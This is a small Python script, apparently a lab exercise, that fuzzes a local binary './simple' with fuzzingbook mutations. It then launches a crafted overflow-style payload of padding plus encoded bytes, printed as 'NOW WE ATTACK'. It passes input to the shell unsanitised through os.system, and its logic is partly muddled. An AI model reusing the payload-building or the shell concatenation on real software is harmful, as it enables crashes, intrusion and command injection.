# This is a sample Python script.

# Press Shift+F10 to execute it or replace it with your code.
# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
from io import BytesIO

from fuzzingbook.Fuzzer import RandomFuzzer
import os

from fuzzingbook.GrammarCoverageFuzzer import GrammarCoverageFuzzer
from fuzzingbook.Grammars import Grammar, EXPR_GRAMMAR, CGI_GRAMMAR, START_SYMBOL, URL_GRAMMAR
from fuzzingbook.MutationFuzzer import MutationFuzzer
from fuzzingbook.SearchBasedFuzzer import mutate


def print_hi(name):
    # Use a breakpoint in the code line below to debug your script.
    print(f'Hi, {name}')  # Press Ctrl+F8 to toggle the breakpoint.


# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    f = RandomFuzzer()
    seed_input = "aaaa"
    mutations = 100
    inp = seed_input
    maxLen = 0
    for i in range(mutations):

        inp = mutate(inp)
        currLen = len(repr(inp))
        if os.system("./simple " + repr(inp)) == 0:
            if maxLen < currLen:
                maxLen = currLen
                if i % 5 == 0:
                    print(i, "was good with len=", currLen)
                else:
                    print(i, "crushed the system with len=", currLen)

    print(f"The maximum good input that was found is {maxLen}")
    attack = ""
    for i in range(maxLen):
        attack = attack + "a"

    attack = attack + "慡慡慡慡慡慡慡慡慡쌑઀"

    print("NOW WE ATTACK")
    print("This is our weapon ", attack)
    if os.system("./simple " + attack) == 0:
        print("HAHA GOCHU")

# See PyCharm help at https://www.jetbrains.com/help/pycharm/
